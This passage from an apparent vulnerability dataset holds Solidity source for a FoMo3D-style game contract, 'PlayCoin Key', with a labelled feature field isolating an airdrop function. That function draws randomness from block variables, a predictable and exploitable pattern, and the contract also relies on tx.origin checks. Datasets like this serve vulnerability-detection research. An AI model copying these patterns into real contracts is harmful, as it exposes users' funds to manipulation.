failed\");\n return a - b;\n }\n function add(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n c = a + b;\n require(c >= a, \"SafeMath add failed\");\n return c;\n }\n function sqrt(uint256 x)\n internal\n pure\n returns (uint256 y)\n {\n uint256 z = ((add(x,1)) / 2);\n y = x;\n while (z < y)\n {\n y = z;\n z = ((add((x / z),z)) / 2);\n }\n }\n function sq(uint256 x)\n internal\n pure\n returns (uint256)\n {\n return (mul(x,x));\n }\n function pwr(uint256 x, uint256 y)\n internal\n pure\n returns (uint256)\n {\n if (x==0)\n return (0);\n else if (y==0)\n return (1);\n else\n {\n uint256 z = x;\n for (uint256 i=1; i < y; i++)\n z = mul(z,x);\n return (z);\n }\n }\n}",
  "extract_feature": [
    "function airdrop() private view returns(bool) {\nuint256 seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp).add\n(block.difficulty).add\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n(block.gaslimit).add\n((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n(block.number)\n)));\nif((seed - ((seed / 1000) * 1000)) < airDropTracker_)\nreturn(true);\nelse\nreturn(false);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b6b"
  },
  "filename": "3097.sol",
  "content": "pragma solidity ^0.4.24;\ncontract PCKevents {\n event onNewName\n (\n uint256 indexed playerID,\n address indexed playerAddress,\n bytes32 indexed playerName,\n bool isNewPlayer,\n uint256 affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 amountPaid,\n uint256 timeStamp\n );\n event onEndTx\n (\n uint256 compressedData,\n uint256 compressedIDs,\n bytes32 playerName,\n address playerAddress,\n uint256 ethIn,\n uint256 keysBought,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount,\n uint256 potAmount,\n uint256 airDropPot\n );\n event onWithdraw\n (\n uint256 indexed playerID,\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 timeStamp\n );\n event onWithdrawAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onBuyAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethIn,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onReLoadAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onAffiliatePayout\n (\n uint256 indexed affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 indexed roundID,\n uint256 indexed buyerID,\n uint256 amount,\n uint256 timeStamp\n );\n event onPotSwapDeposit\n (\n uint256 roundID,\n uint256 amountAddedToPot\n );\n}\ncontract modularKey is PCKevents {}\ncontract PlayCoinKey is modularKey {\n using SafeMath for *;\n using NameFilter for string;\n using PCKKeysCalcLong for uint256;\n otherPCK private otherPCK_;\n PlayCoinGodInterface constant private PCGod = PlayCoinGodInterface(0x6f93Be8fD47EBb62F54ebd149B58658bf9BaCF4f);\n PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x47D1c777f1853cac97E6b81226B1F5108FBD7B81);\n string constant public name = \"PlayCoin Key\";\n string constant public symbol = \"PCK\";\n uint256 private rndExtra_ = 15 minutes;\n uint256 private rndGap_ = 15 minutes;\n uint256 constant private rndInit_ = 12 hours;\n uint256 constant private rndInc_ = 30 seconds;\n uint256 constant private rndMax_ = 6 hours;\n uint256 constant private rndMin_ = 10 minutes;\n uint256 public rndReduceThreshold_ = 10e18;\n bool public closed_ = false;\n address private admin = msg.sender;\n uint256 public airDropPot_;\n uint256 public airDropTracker_ = 0;\n uint256 public rID_;\n mapping (address => uint256) public pIDxAddr_;\n mapping (bytes32 => uint256) public pIDxName_;\n mapping (uint256 => PCKdatasets.Player) public plyr_;\n mapping (uint256 => mapping (uint256 => PCKdatasets.PlayerRounds)) public plyrRnds_;\n mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;\n mapping (uint256 => PCKdatasets.Round) public round_;\n mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;\n mapping (uint256 => PCKdatasets.TeamFee) public fees_;\n mapping (uint256 => PCKdatasets.PotSplit) public potSplit_;\n constructor()\n public\n {\n fees_[0] = PCKdatasets.TeamFee(30,6);\n fees_[1] = PCKdatasets.TeamFee(43,0);\n fees_[2] = PCKdatasets.TeamFee(56,10);\n fees_[3] = PCKdatasets.TeamFee(43,8);\n potSplit_[0] = PCKdatasets.PotSplit(15,10);\n potSplit_[1] = PCKdatasets.PotSplit(25,0);\n potSplit_[2] = PCKdatasets.PotSplit(20,20);\n potSplit_[3] = PCKdatasets.PotSplit(30,10);\n }\n modifier isActivated() {\n require(activated_ == true, \"its not ready yet. check ?eta in discord\");\n _;\n }\n modifier isRoundActivated() {\n require(round_[rID_].ended == false, \"the round is finished\");\n _;\n }\n modifier isHuman() {\n address _addr = msg.sender;\n uint256 _codeLength;\n require(msg.sender == tx.origin, \"sorry humans only\");\n _;\n }\n modifier isWithinLimits(uint256 _eth) {\n require(_eth >= 1000000000, \"pocket lint: not a valid currency\");\n require(_eth <= 100000000000000000000000, \"no vitalik, no\");\n _;\n }\n modifier onlyAdmins() {\n require(msg.sender == admin, \"onlyAdmins failed - msg.sender is not an admin\");\n _;\n }\n function kill () onlyAdmins() public {\n require(round_[rID_].ended == true && closed_ == true, \"the round is active or not close\");\n selfdestruct(admin);\n }\n function getRoundStatus() isActivated() public view returns(uint256, bool){\n return (rID_, round_[rID_].ended);\n }\n function setThreshold(uint256 _threshold) onlyAdmins() public returns(uint256) {\n rndReduceThreshold_ = _threshold;\n return rndReduceThreshold_;\n }\n function setEnforce(bool _closed) onlyAdmins() public returns(bool, uint256, bool) {\n closed_ = _closed;\n if( !closed_ && round_[rID_].ended == true && activated_ == true ){\n nextRound();\n }\n else if( closed_ && round_[rID_].ended == false && activated_ == true ){\n round_[rID_].end = now - 1;\n }\n return (closed_, rID_, now > round_[rID_].end);\n }\n function()\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);\n }\n function buyXid(uint256 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affCode, _team, _eventData_);\n }\n function buyXaddr(address _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function buyXname(bytes32 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affCode, _team, _eth, _eventData_);\n }\n function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function withdraw()\n isActivated()\n isHuman()\n public\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _eth;\n if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n PCKdatasets.EventReturns memory _eventData_;\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onWithdrawAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eth,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n } else {\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n emit PCKevents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);\n }\n }\n function registerNameXID(string _nameString, uint256 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXaddr(string _nameString, address _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXname(string _nameString, bytes32 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function getBuyPrice()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );\n else\n return ( 75000000000000 );\n }\n function getTimeLeft()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now < round_[_rID].end)\n if (_now > round_[_rID].strt + rndGap_)\n return( (round_[_rID].end).sub(_now) );\n else\n return( (round_[_rID].strt + rndGap_).sub(_now) );\n else\n return(0);\n }\n function getPlayerVaults(uint256 _pID)\n public\n view\n returns(uint256 ,uint256, uint256)\n {\n uint256 _rID = rID_;\n if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n if (round_[_rID].plyr == _pID)\n {\n return\n (\n (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n }\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff\n );\n }\n }\n function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)\n private\n view\n returns(uint256)\n {\n return( ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000) );\n }\n function getCurrentRoundInfo()\n public\n view\n returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n return\n (\n round_[_rID].ico,\n _rID,\n round_[_rID].keys,\n round_[_rID].end,\n round_[_rID].strt,\n round_[_rID].pot,\n (round_[_rID].team + (round_[_rID].plyr * 10)),\n plyr_[round_[_rID].plyr].addr,\n plyr_[round_[_rID].plyr].name,\n rndTmEth_[_rID][0],\n rndTmEth_[_rID][1],\n rndTmEth_[_rID][2],\n rndTmEth_[_rID][3],\n airDropTracker_ + (airDropPot_ * 1000)\n );\n }\n function getPlayerInfoByAddress(address _addr)\n public\n view\n returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n if (_addr == address(0))\n {\n _addr == msg.sender;\n }\n uint256 _pID = pIDxAddr_[_addr];\n return\n (\n _pID,\n plyr_[_pID].name,\n plyrRnds_[_pID][_rID].keys,\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff,\n plyrRnds_[_pID][_rID].eth\n );\n }\n function buyCore(uint256 _pID, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > (round_[_rID].strt + rndGap_) && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n core(_rID, _pID, msg.value, _affID, _team, _eventData_);\n } else {\n if ( _now > round_[_rID].end && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ){\n nextRound();\n }\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onBuyAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n msg.value,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);\n }\n }\n function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, PCKdatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > ( round_[_rID].strt + rndGap_ ) && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);\n core(_rID, _pID, _eth, _affID, _team, _eventData_);\n } else if ( _now > round_[_rID].end && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ) {\n nextRound();\n }\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onReLoadAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n }\n function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n if (plyrRnds_[_pID][_rID].keys == 0)\n _eventData_ = managePlayer(_pID, _eventData_);\n if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)\n {\n uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);\n uint256 _refund = _eth.sub(_availableLimit);\n plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);\n _eth = _availableLimit;\n }\n if (_eth > 1000000000)\n {\n uint256 _keys = (round_[_rID].eth).keysRec(_eth);\n if (_keys >= 1000000000000000000)\n {\n updateTimer(_keys, _rID, _eth);\n if (round_[_rID].plyr != _pID)\n round_[_rID].plyr = _pID;\n if (round_[_rID].team != _team)\n round_[_rID].team = _team;\n _eventData_.compressedData = _eventData_.compressedData + 100;\n }\n if (_eth >= 100000000000000000) {\n airDropTracker_++;\n if (airdrop() == true) {\n uint256 _prize;\n if (_eth >= 10000000000000000000)\n {\n _prize = ((airDropPot_).mul(75)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {\n _prize = ((airDropPot_).mul(50)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 200000000000000000000000000000000;\n } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {\n _prize = ((airDropPot_).mul(25)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n }\n _eventData_.compressedData += 10000000000000000000000000000000;\n _eventData_.compressedData += _prize * 1000000000000000000000000000000000;\n airDropTracker_ = 0;\n }\n }\n _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);\n plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);\n plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);\n round_[_rID].keys = _keys.add(round_[_rID].keys);\n round_[_rID].eth = _eth.add(round_[_rID].eth);\n rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);\n _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);\n _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);\n endTx(_pID, _team, _eth, _keys, _eventData_);\n }\n }\n function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)\n private\n view\n returns(uint256)\n {\n return( (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask) );\n }\n function calcKeysReceived(uint256 _rID, uint256 _eth)\n public\n view\n returns(uint256)\n {\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].eth).keysRec(_eth) );\n else\n return ( (_eth).keys() );\n }\n function iWantXKeys(uint256 _keys)\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );\n else\n return ( (_keys).eth() );\n }\n function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if (pIDxAddr_[_addr] != _pID)\n pIDxAddr_[_addr] = _pID;\n if (pIDxName_[_name] != _pID)\n pIDxName_[_name] = _pID;\n if (plyr_[_pID].addr != _addr)\n plyr_[_pID].addr = _addr;\n if (plyr_[_pID].name != _name)\n plyr_[_pID].name = _name;\n if (plyr_[_pID].laff != _laff)\n plyr_[_pID].laff = _laff;\n if (plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function receivePlayerNameList(uint256 _pID, bytes32 _name)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if(plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function determinePID(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_pID == 0)\n {\n _pID = PlayerBook.getPlayerID(msg.sender);\n bytes32 _name = PlayerBook.getPlayerName(_pID);\n uint256 _laff = PlayerBook.getPlayerLAff(_pID);\n pIDxAddr_[msg.sender] = _pID;\n plyr_[_pID].addr = msg.sender;\n if (_name != \"\")\n {\n pIDxName_[_name] = _pID;\n plyr_[_pID].name = _name;\n plyrNames_[_pID][_name] = true;\n }\n if (_laff != 0 && _laff != _pID)\n plyr_[_pID].laff = _laff;\n _eventData_.compressedData = _eventData_.compressedData + 1;\n }\n return (_eventData_);\n }\n function verifyTeam(uint256 _team)\n private\n pure\n returns (uint256)\n {\n if (_team < 0 || _team > 3)\n return(2);\n else\n return(_team);\n }\n function managePlayer(uint256 _pID, PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n if (plyr_[_pID].lrnd != 0)\n updateGenVault(_pID, plyr_[_pID].lrnd);\n plyr_[_pID].lrnd = rID_;\n _eventData_.compressedData = _eventData_.compressedData + 10;\n return(_eventData_);\n }\n function nextRound() private {\n rID_++;\n round_[rID_].strt = now;\n round_[rID_].end = now.add(rndInit_).add(rndGap_);\n }\n function endRound(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _rID = rID_;\n uint256 _winPID = round_[_rID].plyr;\n uint256 _winTID = round_[_rID].team;\n uint256 _pot = round_[_rID].pot;\n uint256 _win = (_pot.mul(48)) / 100;\n uint256 _com = (_pot / 50);\n uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;\n uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;\n uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);\n if (_dust > 0)\n {\n _gen = _gen.sub(_dust);\n _res = _res.add(_dust);\n }\n plyr_[_winPID].win = _win.add(plyr_[_winPID].win);\n if (!address(admin).call.value(_com)())\n {\n _p3d = _p3d.add(_com);\n _com = 0;\n }\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n if (_p3d > 0)\n PCGod.deposit.value(_p3d)();\n _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);\n _eventData_.winnerAddr = plyr_[_winPID].addr;\n _eventData_.winnerName = plyr_[_winPID].name;\n _eventData_.amountWon = _win;\n _eventData_.genAmount = _gen;\n _eventData_.PCPAmount = _p3d;\n _eventData_.newPot = _res;\n _rID++;\n round_[_rID].ended = false;\n round_[_rID].strt = now;\n round_[_rID].end = now.add(rndInit_).add(rndGap_);\n round_[_rID].pot = _res;\n return(_eventData_);\n }\n function updateGenVault(uint256 _pID, uint256 _rIDlast)\n private\n {\n uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);\n if (_earnings > 0)\n {\n plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);\n plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);\n }\n }\n function updateTimer(uint256 _keys, uint256 _rID, uint256 _eth)\n private\n {\n uint256 _now = now;\n uint256 _newTime;\n if (_now > round_[_rID].end && round_[_rID].plyr == 0)\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);\n else\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);\n uint256 _newEndTime;\n if (_newTime < (rndMax_).add(_now))\n _newEndTime = _newTime;\n else\n _newEndTime = rndMax_.add(_now);\n if ( _eth >= rndReduceThreshold_ ) {\n _newEndTime = (_newEndTime).sub( (((_keys) / (1000000000000000000))).mul(rndInc_).add( (((_keys) / (2000000000000000000) ).mul(rndInc_)) ) );\n if( _newEndTime < _now + rndMin_ )\n _newEndTime = _now + rndMin_ ;\n }\n round_[_rID].end = _newEndTime;\n }\n function airdrop() private view returns(bool) {\n uint256 seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp).add\n (block.difficulty).add\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n (block.gaslimit).add\n ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n (block.number)\n )));\n if((seed - ((seed / 1000) * 1000)) < airDropTracker_)\n return(true);\n else\n return(false);\n }\n function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _com = _eth / 50;\n uint256 _p3d;\n if (!address(admin).call.value(_com)())\n {\n _p3d = _com;\n _com = 0;\n }\n uint256 _long = _eth / 100;\n otherPCK_.potSwap.value(_long)();\n uint256 _aff = _eth / 10;\n if (_affID != _pID && plyr_[_affID].name != '') {\n plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);\n emit PCKevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);\n } else {\n _p3d = _aff;\n }\n _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));\n if (_p3d > 0)\n {\n PCGod.deposit.value(_p3d)();\n _eventData_.PCPAmount = _p3d.add(_eventData_.PCPAmount);\n }\n return(_eventData_);\n }\n function potSwap()\n external\n payable\n {\n uint256 _rID = rID_ + 1;\n round_[_rID].pot = round_[_rID].pot.add(msg.value);\n emit PCKevents.onPotSwapDeposit(_rID, msg.value);\n }\n function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;\n uint256 _air = (_eth / 100);\n airDropPot_ = airDropPot_.add(_air);\n _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));\n uint256 _pot = _eth.sub(_gen);\n uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);\n if (_dust > 0)\n _gen = _gen.sub(_dust);\n round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);\n _eventData_.genAmount = _gen.add(_eventData_.genAmount);\n _eventData_.potAmount = _pot;\n return(_eventData_);\n }\n function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)\n private\n returns(uint256)\n {\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);\n plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / 